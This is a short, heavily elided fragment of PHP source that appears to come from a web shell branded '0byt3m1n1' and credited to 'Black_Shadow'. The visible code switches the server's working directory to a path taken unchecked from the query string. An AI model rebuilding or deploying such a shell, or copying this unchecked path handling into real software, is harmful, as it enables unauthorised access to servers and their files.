...
?>
    ...
    <body> <?php echo '<div style="color:#ef6c00;margin-top:0;"><h1><center>0byt3m1n1</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
...
echo '<br><center>&copy; 2017 - <a href="http://www.facebook.com/tanvir.sarker01">Black_Shadow</a>.</center><br>'; ?>